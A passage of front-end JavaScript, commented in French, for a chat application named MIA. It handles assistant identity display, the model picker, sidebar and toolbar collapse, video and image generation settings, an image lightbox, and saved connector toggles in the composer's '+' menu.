 * .has-assistant qui masque la toolbar et colore la pilule. Les détails sont
 * toujours REPLIÉS à l'arrivée sur une conversation (défaut demandé : gagner de
 * la place ; le chevron les déploie). `profile === null` = pas d'assistant.
 *
 * Note de synchronisation : le rendu initial est celui du gabarit
 * (templates/chat/index.php, #assistantIdentity) — mêmes ids, même structure.
 */
function renderAssistantIdentity(profile, ctx = {}) {
    const main    = document.querySelector('.chat-main');
    const root    = document.getElementById('assistantIdentity');
    const editBtn = document.getElementById('profileEditBtn');
    main?.classList.toggle('has-assistant', !!profile);
    if (!root) return;
    if (!profile) {
        root.hidden = true;
        if (editBtn) editBtn.hidden = true;
        return;
    }
    const $ = id => document.getElementById(id);
    const avatarFile = String(profile.avatar || '').split('/').pop();
    const avatarSrc  = avatarFile ? '/assets/img/profils/' + avatarFile : (window.LOGO_URL || '/assets/img/logo.png');
    if ($('assistantIdentityAvatar')) $('assistantIdentityAvatar').src = avatarSrc;
    if ($('assistantIdentityName'))   $('assistantIdentityName').textContent = profile.name || t('Assistant');
    if ($('assistantIdentityDesc'))   $('assistantIdentityDesc').textContent =
        profile.description || t('Cet assistant applique des instructions dédiées à ce cas d\'usage.');

    const llmKey  = String(ctx.llmKey || '');
    const llmInfo = ctx.llmInfo || {};
    if ($('assistantIdentityLlmIcon'))     $('assistantIdentityLlmIcon').src = llmInfo.logo || (window.LOGO_URL || '');
    if ($('assistantIdentityLlmProvider')) $('assistantIdentityLlmProvider').textContent =
        llmInfo.provider || (llmKey.split('::')[0] || llmKey);
    if ($('assistantIdentityLlmVersion'))  $('assistantIdentityLlmVersion').textContent =
        llmInfo.version || llmInfo.label || (llmKey.split('::')[1] || llmKey);

    const toolsEl = $('assistantIdentityTools');
    if (toolsEl) {
        const icons = window.TOOL_TYPE_ICONS || {};
        toolsEl.innerHTML = (ctx.tools || []).map(outil => {
            const icon = icons[outil.type] || icons.generic || '';
            return `<span class="assistant-identity-chip" title="Outil de cet assistant — appelé automatiquement par le modèle">${icon}<span>${escHtml(outil.name || '')}</span></span>`;
        }).join('');
    }
    const kbsEl = $('assistantIdentityKbs');
    if (kbsEl) {
        const kbs = ctx.kbs || [];
        kbsEl.hidden = kbs.length === 0;
        kbsEl.title  = kbs.map(k => k.name || '').filter(Boolean).join(', ');
        const label = $('assistantIdentityKbsLabel');
        if (label) label.textContent = tn(kbs.length, '{n} base de connaissances', '{n} bases de connaissances');
    }

    // Horloge : programmer une tâche avec CET assistant (lien sans JavaScript
    // mis à jour au changement de conversation, comme celui de « Modifier »).
    const scheduleBtn = document.getElementById('assistantScheduleBtn');
    if (scheduleBtn) {
        scheduleBtn.dataset.profileId = String(profile.id);
        scheduleBtn.href = '/settings/schedules/new?compose=1&profile=' + encodeURIComponent(String(profile.id));
    }

    // Raccourci d'édition : le droit est tranché côté serveur, assistant par
    // assistant (un creator ne gère que les siens).
    if (editBtn) {
        editBtn.hidden = !ctx.canManage;
        editBtn.href   = '/admin/profiles/' + encodeURIComponent(String(profile.id)) + '/edit';
    }

    const details = $('assistantIdentityDetails');
    const toggle  = $('assistantIdentityToggle');
    if (details) details.hidden = true;
    toggle?.setAttribute('aria-expanded', 'false');
    root.hidden = false;
}

/** Présentation d'un assistant dans une conversation encore vide (même DOM que le gabarit). */
function buildAssistantWelcomeHtml(profile) {
    const avatarFile = String(profile.avatar || '').split('/').pop();
    const avatarSrc  = avatarFile ? '/assets/img/profils/' + avatarFile : (window.LOGO_URL || '/assets/img/logo.png');
    const desc = profile.description
        ? `<p class="assistant-welcome-desc">${escHtml(profile.description)}</p>` : '';
    return `<div class="chat-welcome assistant-welcome" id="assistantWelcome">
        <img class="assistant-welcome-avatar" src="${escAttr(avatarSrc)}" alt="">
        <p class="assistant-welcome-kicker">Assistant</p>
        <h2 class="assistant-welcome-name">${escHtml(profile.name || 'Assistant')}</h2>
        ${desc}
    </div>`;
}

// Repli / déploiement des caractéristiques de l'assistant (chevron de la pilule).
(function () {
    const toggle  = document.getElementById('assistantIdentityToggle');
    const details = document.getElementById('assistantIdentityDetails');
    if (!toggle || !details) return;
    toggle.addEventListener('click', () => {
        const open = details.hidden;
        details.hidden = !open;
        toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
    });
})();

// Appliquer la couleur de l'assistant actuel au chargement
(function () {
    const sel = document.getElementById('profileSelect');
    if (!sel) return;
    const opt = sel.options[sel.selectedIndex];
    if (opt) applyProfileColor(opt.dataset.color || '');
})();

profileSel?.addEventListener('change', () => {
    const opt = profileSel.options[profileSel.selectedIndex];
    applyProfileColor(opt?.dataset.color || '');
});

// ---- LLM Picker ----
/**
 * Un seul popover ouvert à la fois dans le composer (« + », bases, assistants,
 * modèle). SOURCE UNIQUE : quatre gestionnaires qui se ferment mutuellement à
 * la main, c'est douze lignes à tenir à jour au cinquième popover — et une
 * oubliée ne se voit pas.
 * @param {string} except  clé du popover à NE PAS fermer
 */
window.closeComposerPopovers = function (except) {
    if (except !== 'plus') window.closePlusMenu?.();
    if (except !== 'kb')   window.closeKbPicker?.();
    if (except !== 'assistant') {
        document.getElementById('assistantPickerList')?.style.setProperty('display', 'none');
        document.getElementById('assistantPickerBtn')?.setAttribute('aria-expanded', 'false');
    }
    if (except !== 'llm') document.getElementById('llmPickerList')?.style.setProperty('display', 'none');
};

/**
 * Téléphone : place disponible AU-DESSUS de la pilule pour un popover du
 * composer (« + », assistants, bases), que main.css (bloc ≤ 768 px) pose juste
 * au-dessus d'elle. Sans elle, le panneau garde le plafond de la feuille de
 * style et sortirait par le haut quand la pilule est centrée (accueil) ou
 * haute (long texte, pièces jointes). Relue à l'ouverture et quand la zone
 * visible change (clavier qui se ferme, barre d'adresse).
 * @param {HTMLElement|null} panel
 */
window.fitComposerPopover = function (panel) {
    if (!panel) return;
    if (!window.matchMedia('(max-width: 768px)').matches) {
        panel.style.removeProperty('--composer-popover-room');
        return;
    }
    const box = document.getElementById('inputBox');
    if (!box) return;
    const header = document.getElementById('mobileHeader')?.getBoundingClientRect();
    const plafond = header && header.height > 0 ? Math.max(0, header.bottom) : 0;
    // Pixels d'ÉCRAN (getBoundingClientRect) → pixels de page : la taille
    // d'affichage zoomerait une seconde fois la hauteur écrite.
    const z = window.miaUiZoom ? window.miaUiZoom() : 1;
    const place = (box.getBoundingClientRect().top - plafond - 16) / z;
    panel.style.setProperty('--composer-popover-room', Math.max(160, Math.floor(place)) + 'px');
};
(function () {
    const refit = () => ['plusMenuPanel', 'assistantPickerList', 'kbPickerPanel']
        .forEach(id => window.fitComposerPopover(document.getElementById(id)));
    window.visualViewport?.addEventListener('resize', refit);
    window.addEventListener('resize', refit);
})();

(function () {
    const btn  = document.getElementById('llmPickerBtn');
    const list = document.getElementById('llmPickerList');
    const inp  = document.getElementById('llmSelect');
    if (!btn || !list) return;

    btn.addEventListener('click', e => {
        e.stopPropagation();
        window.closeComposerPopovers('llm');
        list.style.display = list.style.display === 'none' ? '' : 'none';
    });

    // Applique un modèle au chat (champ caché + chip + barres d'info).
    // Extrait du handler de clic : la modale « changer de modèle » des
    // connecteurs applique exactement la même bascule.
    const applyItem = (item) => {
        const val   = item.dataset.value;
        const logo  = item.dataset.logo;
        const label = item.dataset.label;
        inp.value = val;
        btn.querySelector('img').src = logo;
        btn.querySelector('span').textContent = label;
        list.querySelectorAll('.llm-picker-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        list.style.display = 'none';
        updateLlmInfoBar(val);
        updateTopToolbarMeta({ modelLabel: label, modelCost: item.dataset.cost || 0, modelCostTitle: item.dataset.costTitle || '', modelLogo: item.dataset.logo || '' });
        updateImageToggle(val);
        if (String(val || '').trim().toLowerCase() !== 'perplexity::sonar-pro') {
            closeSourcesViewer();
        }
    };

    // Bascule programmatique vers un modèle du picker. Renvoie false si le
    // slug n'est pas dans la liste autorisée pour cet utilisateur.
    window.applyLlmChoice = (value) => {
        const item = Array.from(list.querySelectorAll('.llm-picker-item[data-value]'))
            .find(i => i.dataset.value === value);
        if (!item) return false;
        applyItem(item);
        return true;
    };

    list.querySelectorAll('.llm-picker-item:not(.modal-llm-item)').forEach(item => {
        item.addEventListener('click', () => applyItem(item));
    });

    document.addEventListener('click', () => { list.style.display = 'none'; });

    // Initialisation de la barre d'info et du toggle image
    updateLlmInfoBar(inp?.value);
    updateImageToggle(inp?.value);
})();

// ---- Repli/déploiement du bandeau d'infos (toolbar) ----
(function() {
    const toolbar = document.getElementById('chatToolbar');
    const btn     = document.getElementById('toolbarCollapseBtn');
    if (!toolbar || !btn) return;
    const KEY = 'toolbarCollapsed';

    function apply(collapsed) {
        toolbar.classList.toggle('is-collapsed', collapsed);
        btn.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
        btn.setAttribute('aria-label', collapsed ? t('Afficher le bandeau') : t('Masquer le bandeau'));
    }

    // Replié par défaut : seul un « 0 » mémorisé (la personne l'a déplié)
    // le rouvre. Stockage indisponible (navigation privée) : replié.
    let stored = null;
    try { stored = localStorage.getItem(KEY); } catch (_e) {}
    apply(stored !== '0');

    btn.addEventListener('click', () => {
        const collapsed = !toolbar.classList.contains('is-collapsed');
        apply(collapsed);
        try { localStorage.setItem(KEY, collapsed ? '1' : '0'); } catch (_e) {}
    });
})();

// ---- Repli/déploiement du volet latéral (desktop) ----
(function() {
    const sidebar     = document.getElementById('sidebar');
    const collapseBtn = document.getElementById('sidebarCollapseBtn');
    const reopenBtn   = document.getElementById('sidebarReopenBtn');
    if (!sidebar || !collapseBtn) return;
    const KEY = 'sidebarCollapsed';

    function apply(collapsed) {
        document.body.classList.toggle('sidebar-collapsed', collapsed);
        collapseBtn.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
        reopenBtn?.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
    }

    apply(localStorage.getItem(KEY) === '1');

    function setCollapsed(collapsed) {
        apply(collapsed);
        localStorage.setItem(KEY, collapsed ? '1' : '0');
    }

    collapseBtn.addEventListener('click', () => {
        // Mobile : le volet est un drawer (nav-drawer.js), le bouton le referme.
        if (window.innerWidth <= 768) {
            window.NavDrawer?.close();
            return;
        }
        setCollapsed(true);
    });
    reopenBtn?.addEventListener('click', () => setCollapsed(false));

    // Exposé pour les autres scripts (déployer ou replier le volet sans
    // connaître son balisage).
    window.MiaSidebar = {
        expand:   () => setCollapsed(false),
        collapse: () => setCollapsed(true),
    };
})();

// ---- Fermeture du drawer mobile à la navigation ----
// L'ouverture/fermeture du drawer est portée par nav-drawer.js ([data-drawer-toggle]).
// Ici : sur mobile, la sidebar se ferme uniquement sur navigation vers une conv
// (pas sur clic du menu 3-points ni de l'input de renommage).
(function() {
    function closeOnConvClick(e) {
        if (window.innerWidth > 768) return;
        if (e.target.closest('[data-conv-menu]')) return;
        if (e.target.closest('#convMenu')) return;
        if (e.target.closest('.conv-title-edit')) return;
        const it = e.target.closest('.conv-item');
        if (it && !it.classList.contains('is-editing')) window.NavDrawer?.close();
    }
    document.getElementById('convList')?.addEventListener('click', closeOnConvClick);
})();

// ---- Rendu markdown des messages existants ----
document.querySelectorAll('.msg-content[data-role="assistant"]').forEach(el => {
    const raw = el.dataset.raw || '';
    const mdEl = el.querySelector('.md-render');
    if (mdEl && raw && looksLikeErrorMessage(raw)) {
        // Erreur persistée : même bloc qu'en direct et qu'au changement de
        // conversation. Ce chemin — le chargement complet de la page — rendait
        // le texte ⚠ en simple Markdown, sans titre ni encadré.
        mdEl.innerHTML = buildErrorBlockHtml(errorPayloadFromText(raw));
        el.dataset.errorBlock = '1';
    } else if (mdEl && raw) {
        mdEl.innerHTML = renderMarkdown(raw);
        hydrateGeneratedFiles(mdEl);
        initCodeCopyBtns(el);
        renderMermaidBlocks(el);
    }
    // Boutons d'action pour les messages PHP rendus
    const body = el.closest('.msg-body');
    if (body && !body.querySelector('.msg-actions')) {
        const actions = document.createElement('div');
        actions.className = 'msg-actions';
        actions.innerHTML = buildAssistantActionsHtml(raw);
        body.appendChild(actions);
    }
});

// ---- Scroll initial en bas ----
scrollBottom(true);

function escHtml(str) {
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ---- Outil de génération actif ----
// État unique de l'outil engagé, posé par applySelectedTool() (menu « + ») et
// mémorisé par conversation — cf. la section « Mémoire de l'outil actif ».
let selectedTool = null; // {id, type, name, provider, model} ou null
// Lecture seule pour tool-suggest.js : un outil engagé désactive la suggestion.
window.__getSelectedTool = () => selectedTool;
const videoToolsMap = new Map((window.VIDEO_TOOLS || []).map(tool => [String(tool.id), tool]));
const htmlToolsMap  = new Map((window.HTML_TOOLS  || []).map(tool => [String(tool.id), tool]));
const videoToolCapabilities = window.VIDEO_TOOL_CAPABILITIES || {};
let videoConfigModalBound = false;
let activeVideoConfigResolve = null;

function escAttr(str) {
    return escHtml(String(str || '')).replace(/"/g, '&quot;');
}

function defaultVideoCapabilitiesForTool(tool) {
    const provider = tool?.provider || 'openai';
    const model = tool?.model || 'sora-2';
    if (provider === 'openai') {
        return {
            provider,
            provider_label: 'OpenAI (Sora)',
            model_options: [
                { value: 'sora-2', label: 'Sora 2' },
            ],
            seconds_options: [
                { value: '4', label: '4 secondes' },
                { value: '8', label: '8 secondes' },
                { value: '12', label: '12 secondes' },
            ],
            size_options: [
                { value: '720x1280', label: '720×1280 (portrait)' },
                { value: '1280x720', label: '1280×720 (paysage)' },
                { value: '1024x1792', label: t('1024×1792 (portrait HD)') },
                { value: '1792x1024', label: t('1792×1024 (paysage HD)') },
            ],
            format_options: [
                { value: 'mp4', label: 'MP4' },
            ],
            defaults: {
                model,
                seconds: '4',
                size: '720x1280',
                format: 'mp4',
            },
        };
    }

    return {
        provider,
        provider_label: provider || 'Provider',
        model_options: [{ value: model, label: model }],
        seconds_options: [{ value: '4', label: '4 secondes' }],
        size_options: [{ value: '720x1280', label: '720x1280' }],
        format_options: [{ value: 'mp4', label: 'MP4' }],
        defaults: { model, seconds: '4', size: '720x1280', format: 'mp4' },
    };
}

function getVideoCapabilities(toolId) {
    const key = String(toolId || '');
    const tool = videoToolsMap.get(key) || null;
    return videoToolCapabilities[key] || defaultVideoCapabilitiesForTool(tool);
}

function fillVideoSelect(selectEl, options, fallbackValue) {
    if (!selectEl) return '';
    const list = Array.isArray(options) ? options : [];
    selectEl.innerHTML = list.map(opt => {
        const value = String(opt?.value || '');
        const label = String(opt?.label || value);
        return `<option value="${escAttr(value)}">${escHtml(label)}</option>`;
    }).join('');

    const hasFallback = list.some(opt => String(opt?.value || '') === String(fallbackValue || ''));
    if (!hasFallback && fallbackValue) {
        const opt = document.createElement('option');
        opt.value = fallbackValue;
        opt.textContent = fallbackValue;
        selectEl.appendChild(opt);
    }
    if (fallbackValue) {
        selectEl.value = fallbackValue;
    }
    if (!selectEl.value && selectEl.options.length > 0) {
        selectEl.selectedIndex = 0;
    }
    return selectEl.value || '';
}

function closeVideoConfigModal(result) {
    const modal = document.getElementById('videoConfigModal');
    if (modal) modal.style.display = 'none';
    if (activeVideoConfigResolve) {
        const resolve = activeVideoConfigResolve;
        activeVideoConfigResolve = null;
        resolve(result);
    }
}

function bindVideoConfigModal() {
    if (videoConfigModalBound) return;
    videoConfigModalBound = true;

    const modal = document.getElementById('videoConfigModal');
    const form = document.getElementById('videoConfigForm');
    const cancelBtn = document.getElementById('videoConfigCancel');
    if (!modal || !form) return;

    cancelBtn?.addEventListener('click', () => closeVideoConfigModal(null));

    form.addEventListener('submit', e => {
        e.preventDefault();
        const roleRadio = document.querySelector('input[name="video_image_role_radio"]:checked');
        const imageRole = roleRadio?.value || 'none';
        const imageFile = imageRole !== 'none' ? (modal._videoImageFile || null) : null;

        closeVideoConfigModal({
            model: document.getElementById('videoConfigModel')?.value || '',
            seconds: document.getElementById('videoConfigSeconds')?.value || '',
            size: document.getElementById('videoConfigSize')?.value || '',
            format: document.getElementById('videoConfigFormat')?.value || '',
            image: imageFile ? { file: imageFile, role: imageRole } : null,
        });
    });

    modal.addEventListener('click', e => {
        if (e.target === modal) {
            closeVideoConfigModal(null);
        }
    });

    document.addEventListener('keydown', e => {
        if (e.key === 'Escape' && modal.style.display !== 'none') {
            closeVideoConfigModal(null);
        }
    });

    // Gestion de l'image
    const imageSection  = document.getElementById('videoImageSection');
    const imagePicker   = document.getElementById('videoImagePicker');
    const imageInput    = document.getElementById('videoImageInput');
    const imagePreview  = document.getElementById('videoImagePreview');
    const previewImg    = document.getElementById('videoImagePreviewImg');
    const imageClear    = document.getElementById('videoImageClear');
    const imageDropZone = document.getElementById('videoImageDropZone');
    const imageDropLabel= document.getElementById('videoImageDropLabel');

    function applyVideoImage(file) {
        if (!file || !file.type.startsWith('image/')) return;
        const url = URL.createObjectURL(file);
        if (previewImg) previewImg.src = url;
        if (imagePreview) imagePreview.style.display = 'block';
        if (imageDropZone) imageDropZone.style.display = 'none';
        modal._videoImageFile = file;
    }

    function clearVideoImage() {
        if (imageInput) imageInput.value = '';
        if (imagePreview) imagePreview.style.display = 'none';
        if (imageDropZone) imageDropZone.style.display = '';
        if (imageDropLabel) imageDropLabel.textContent = t('Cliquer ou glisser une image ici');
        modal._videoImageFile = null;
    }

    document.querySelectorAll('input[name="video_image_role_radio"]').forEach(radio => {
        radio.addEventListener('change', () => {
            const showPicker = radio.value !== 'none' && radio.checked;
            if (imagePicker) imagePicker.style.display = showPicker ? '' : 'none';
            if (!showPicker) clearVideoImage();
        });
    });

    imageInput?.addEventListener('change', () => {
        const file = imageInput.files?.[0];
        if (file) applyVideoImage(file);
    });

    imageDropZone?.addEventListener('dragover', e => { e.preventDefault(); imageDropZone.style.borderColor = 'var(--accent)'; });
    imageDropZone?.addEventListener('dragleave', () => { imageDropZone.style.borderColor = ''; });
    imageDropZone?.addEventListener('drop', e => {
        e.preventDefault();
        imageDropZone.style.borderColor = '';
        const file = e.dataTransfer.files?.[0];
        if (file) applyVideoImage(file);
    });

    imageClear?.addEventListener('click', e => { e.stopPropagation(); clearVideoImage(); });
}

async function promptVideoSettings(tool) {
    bindVideoConfigModal();
    const modal = document.getElementById('videoConfigModal');
    if (!modal) {
        return {
            model: '',
            seconds: '',
            size: '',
            format: '',
        };
    }

    if (activeVideoConfigResolve) {
        closeVideoConfigModal(null);
    }

    const caps = getVideoCapabilities(tool?.id);
    const defaults = caps.defaults || {};

    const providerInput = document.getElementById('videoConfigProvider');
    const toolName = document.getElementById('videoConfigToolName');
    if (toolName) toolName.textContent = tool?.name || t('Vidéo');
    if (providerInput) providerInput.value = caps.provider_label || caps.provider || '';

    fillVideoSelect(document.getElementById('videoConfigModel'), caps.model_options, defaults.model || '');
    fillVideoSelect(document.getElementById('videoConfigSeconds'), caps.seconds_options, defaults.seconds || '4');
    fillVideoSelect(document.getElementById('videoConfigSize'), caps.size_options, defaults.size || '720x1280');
    fillVideoSelect(document.getElementById('videoConfigFormat'), caps.format_options, defaults.format || 'mp4');

    modal.style.display = 'flex';

    // Affiche ou masque la section image selon les capacités du provider
    const imageSection = document.getElementById('videoImageSection');
    if (imageSection) {
        imageSection.style.display = caps.supports_image_input ? '' : 'none';
    }
    // Réinitialise l'image et le radio au chargement de la modal
    const firstRadio = document.querySelector('input[name="video_image_role_radio"][value="none"]');
    if (firstRadio) { firstRadio.checked = true; firstRadio.dispatchEvent(new Event('change')); }
    const modal2 = document.getElementById('videoConfigModal');
    if (modal2) modal2._videoImageFile = null;

    return await new Promise(resolve => {
        activeVideoConfigResolve = resolve;
    });
}

// ---- Génération d'image ----
async function submitImagine(prompt, toolId) {
    if (!convId()) {
        if (!await createConversation()) return;
    }
    const cid = String(convId());

    // Snapshot des fichiers AVANT clearFiles : pour l'affichage user-side
    // ET pour les transmettre au backend comme image source d'édition.
    const snapshotFiles = [...pendingFiles];

    appendMessage('user', prompt, snapshotFiles);
    msgInput.value = '';
    msgInput.style.height = 'auto';
    sendBtn.disabled = true;
    clearFiles();

    const assistantEl = appendMessage('assistant', '', [], true);
    setJobStatus(assistantEl, t('🎨 Génération en cours… (15–30 s)'));

    const fd = new FormData();
    fd.append('message', prompt);
    if (toolId) fd.append('tool_id', toolId);
    // Toute image attachée est passée au backend comme source d'édition
    // (la 1re image trouvée est utilisée comme base par le modèle).
    snapshotFiles.forEach(f => fd.append('file_tokens[]', f.token));

    await startJob(`/chat/${cid}/imagine`, fd, {
        type: 'image',
        convId: cid,
        el: assistantEl,
        onQuota: () => {
            assistantEl.closest('.message')?.remove();
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
        onError: (err) => {
            renderInlineError(assistantEl, {
                kind: 'generic',
                title: t('Génération impossible'),
                message: err && err.message ? err.message : t('L\'image n\'a pas pu être générée. Réessayez.'),
            });
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
    });
}

// Compatibilité : no-op (les outils sont indépendants du LLM sélectionné)
function updateImageToggle(llmKey) {}

// ---- Lightbox image (zoom au clic) ----
// Clic sur une image d'un message (générée ou jointe) → ouverture plein écran.
// Init différée : le markup #imageLightbox est placé après ce script dans le
// DOM, il n'existe donc pas encore au moment du parse → on attend DOM ready.
(function () {
    function initImageLightbox() {
        const lb      = document.getElementById('imageLightbox');
        const lbImg   = document.getElementById('imageLightboxImg');
        const lbClose = document.getElementById('imageLightboxClose');
        const msgs    = document.getElementById('chatMessages');
        if (!lb || !lbImg || !msgs) return;

        function openLightbox(src, alt) {
            lbImg.src = src;
            lbImg.alt = alt || '';
            lb.style.display = 'flex';
            document.body.classList.add('lightbox-open');
        }
        function closeLightbox() {
            lb.style.display = 'none';
            lbImg.removeAttribute('src');
            document.body.classList.remove('lightbox-open');
        }

        msgs.addEventListener('click', e => {
            const img = e.target.closest('.md-render img, img.msg-image');
            if (!img) return;
            // Exclut avatars, logos de badge LLM, etc.
            if (img.closest('.msg-avatar, .msg-llm-badge')) return;
            openLightbox(img.currentSrc || img.src, img.alt);
        });

        // Clic n'importe où (fond ou image) ferme la lightbox.
        lb.addEventListener('click', closeLightbox);
        lbClose?.addEventListener('click', closeLightbox);
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape' && lb.style.display === 'flex') closeLightbox();
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initImageLightbox);
    } else {
        initImageLightbox();
    }
})();

// ---- Menu « + » du composer (fichiers, options, outils) ----
(function () {
    const btn   = document.getElementById('plusMenuBtn');
    const panel = document.getElementById('plusMenuPanel');
    if (!btn || !panel) return;

    const open  = () => { panel.hidden = false; window.fitComposerPopover(panel); btn.setAttribute('aria-expanded', 'true'); };
    const close = () => { panel.hidden = true;  btn.setAttribute('aria-expanded', 'false'); };
    // Exposé pour l'exclusion mutuelle depuis les autres pickers du composer
    window.closePlusMenu = close;

    btn.addEventListener('click', e => {
        e.stopPropagation();
        window.closeComposerPopovers('plus');
        // Le volet « Connecteurs » repart replié à CHAQUE ouverture du menu
        // (décision produit) ; seule la puce des connecteurs l'ouvre déplié.
        if (panel.hidden) { setFold(false); open(); } else { close(); }
    });
    document.addEventListener('click', e => { if (!e.target.closest('#plusMenu')) close(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
    // Fermeture au changement de LARGEUR seulement : clavier virtuel et barre
    // d'adresse ne changent que la hauteur (Android, Firefox, application
    // Android : `resize` dès que le clavier se ferme) — le menu se refermerait
    // à l'instant où le tap sur « + » l'ouvre. Même règle que le sélecteur de
    // langue et le menu du compte (user-menu.js).
    let lastWidth = window.innerWidth;
    window.addEventListener('resize', () => {
        if (window.innerWidth === lastWidth) return;
        lastWidth = window.innerWidth;
        close();
    });

    // Activation souris + clavier (Enter / Espace) d'un item du menu
    const bindActivate = (el, fn) => {
        if (!el) return;
        el.addEventListener('click', fn);
        el.addEventListener('keydown', e => {
            if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); fn(); }
        });
    };

    // Ajout de fichiers / photos : les inputs cachés restent dans le DOM
    bindActivate(document.getElementById('plusMenuAddFiles'), () => { close(); fileInput?.click(); });
    bindActivate(document.getElementById('plusMenuTakePhoto'), () => { close(); document.getElementById('cameraInput')?.click(); });

    // Options : #webAccessToggle et #driveAccessToggle font foi (lus à
    // l'envoi). Point ambre sur le « + » quand un réglage s'écarte du défaut
    // (Internet OFF, ou l'un des connecteurs personnels ON).
    const webToggle      = document.getElementById('webAccessToggle');
    const driveToggle    = document.getElementById('driveAccessToggle');
    const gmailToggle    = document.getElementById('gmailAccessToggle');
    const calendarToggle = document.getElementById('calendarAccessToggle');
    const tasksToggle    = document.getElementById('tasksAccessToggle');
    const outlookToggle  = document.getElementById('outlookAccessToggle');
    const msCalendarToggle = document.getElementById('mscalendarAccessToggle');
    const msTodoToggle   = document.getElementById('mstodoAccessToggle');
    const teamsToggle    = document.getElementById('teamsAccessToggle');
    const slackToggle    = document.getElementById('slackAccessToggle');
    // « Laisser MIA choisir » : traité comme un connecteur (persistance, garde
    // de modèle compatible, clic sur la ligne) — il ne charge rien lui-même.
    const autoToggle     = document.getElementById('connectorsAutoToggle');
    const optionsDot  = document.getElementById('plusMenuDot');
    // Lignes de connecteur dont la connexion a EXPIRÉ (jeton révoqué par le
    // fournisseur, data-reason="reconnect") : état posé par le serveur, il ne
    // change pas sans rechargement. Elles allument aussi le point ambre du
    // « + » — c'est dans ce menu que la ligne mène à la reconnexion.
    const reconnectRows = Array.from(panel.querySelectorAll('.plus-menu-row[data-reason="reconnect"]'));

    // Persistance du choix de connecteurs : un connecteur activé par
    // l'utilisateur le reste (rechargement, changement de conversation,
    // nouvelle conversation). Clé par utilisateur — sur un navigateur partagé
    // le choix d'un compte ne fuite pas sur un autre.
    const CONNECTOR_PREFS_KEY = 'connectorPrefs:' + (window.CURRENT_USER_ID ?? 'anon');
    const connectorToggles = {
        web:      webToggle,
        drive:    driveToggle,
        gmail:    gmailToggle,
        calendar: calendarToggle,
        tasks:    tasksToggle,
        outlook:  outlookToggle,
        mscalendar: msCalendarToggle,
        mstodo:   msTodoToggle,
        teams:    teamsToggle,
        slack:    slackToggle,
        auto:     autoToggle,
    };
    // Vrai pendant une restauration ou une coupure forcée par le modèle : ces
    // bascules ne viennent pas de l'utilisateur, elles ne doivent rien écraser.
    let persistPaused = false;
    let connectorPrefs = {};
    try { connectorPrefs = JSON.parse(localStorage.getItem(CONNECTOR_PREFS_KEY) || '{}') || {}; }
    catch { connectorPrefs = {}; }
    const saveConnectorPrefs = () => {
        if (persistPaused) return;
        Object.entries(connectorToggles).forEach(([name, t]) => {
            // Un toggle indisponible (connecteur non connecté) ne reflète pas
            // une intention : on garde l'ancien choix.
            if (t && !t.disabled) connectorPrefs[name] = !!t.checked;
        });
        try { localStorage.setItem(CONNECTOR_PREFS_KEY, JSON.stringify(connectorPrefs)); }
        catch { /* quota plein ou navigation privée : pas de persistance, tant pis */ }
    };
    // Restauration : jamais sur une ligne indisponible.
    const restoreConnectorToggle = (name) => {
        const bascule = connectorToggles[name];
        if (!bascule || typeof connectorPrefs[name] !== 'boolean') return;
        if (bascule.disabled || bascule.checked === connectorPrefs[name]) return;
        persistPaused = true;
        bascule.checked = connectorPrefs[name];
        bascule.dispatchEvent(new Event('change'));
        persistPaused = false;
    };

    const syncOptionIndicators = () => {
        // Ligne Internet absente = connecteur masqué par l'admin : ce n'est pas
        // un écart au défaut, sinon le point ambre serait allumé en permanence
        // et le titre annoncerait une option que personne ne peut rétablir.
        const webOn      = !webToggle || !!webToggle.checked;
        const driveOn    = !!driveToggle?.checked;
        const gmailOn    = !!gmailToggle?.checked;
        const calendarOn = !!calendarToggle?.checked;
        const tasksOn    = !!tasksToggle?.checked;
        const outlookOn  = !!outlookToggle?.checked;
        const msCalOn    = !!msCalendarToggle?.checked;
        const msTodoOn   = !!msTodoToggle?.checked;
        const teamsOn    = !!teamsToggle?.checked;
        const slackOn    = !!slackToggle?.checked;
        const autoOn     = !!autoToggle?.checked;
        // Point ambre : Internet coupé, ou une connexion à reconnecter. Les
        // connecteurs allumés (et « Laisser MIA choisir ») ont désormais leur
        // propre témoin à côté du « + » : leurs logos (syncConnectorSummary).
        if (optionsDot) optionsDot.hidden = webOn && reconnectRows.length === 0;
        const notes = [];
        if (!webOn)      notes.push(t('Recherche Internet désactivée'));
        if (driveOn)     notes.push(t('Google Drive activé'));
        if (gmailOn)     notes.push(t('Gmail activé'));
        if (calendarOn)  notes.push(t('Agenda activé'));
        if (tasksOn)     notes.push(t('Tâches activées'));
        if (outlookOn)   notes.push(t('Outlook activé'));
        if (msCalOn)     notes.push(t('Agenda Outlook activé'));
        if (msTodoOn)    notes.push(t('Microsoft To Do activé'));
        if (teamsOn)     notes.push(t('Teams activé'));
        if (slackOn)     notes.push(t('Slack activé'));
        if (autoOn)      notes.push(t('MIA choisit ses connecteurs'));
        reconnectRows.forEach(row => notes.push(t('{service} à reconnecter', { service: row.dataset.service || row.dataset.label || '' })));
        btn.title = t('Fichiers, outils et connecteurs') + (notes.length ? ' — ' + notes.join(', ') : '');
        syncConnectorSummary();
    };

    // ---- Volet « Connecteurs » : replié à chaque ouverture du menu ----
    // Replié, son en-tête dit l'essentiel : combien de connecteurs sont allumés
    // et lesquels (logos). Menu fermé, les mêmes logos s'affichent à côté du
    // « + » (#connectorsChip) — un clic y rouvre le menu sur le volet déplié.
    // Tout se lit dans les interrupteurs : aucun état en double à tenir.
    const foldBtn   = document.getElementById('plusMenuFoldBtn');
    const foldBody  = document.getElementById('plusMenuFoldBody');
    const foldCount = document.getElementById('plusMenuFoldCount');
    const foldLogos = document.getElementById('plusMenuFoldLogos');
    const connChip  = document.getElementById('connectorsChip');
    const MAX_SUMMARY_LOGOS = 3;
    // Aucun état retenu : replié par défaut, à chaque ouverture du menu.
    const setFold = (unfold) => {
        if (!foldBtn || !foldBody) return;
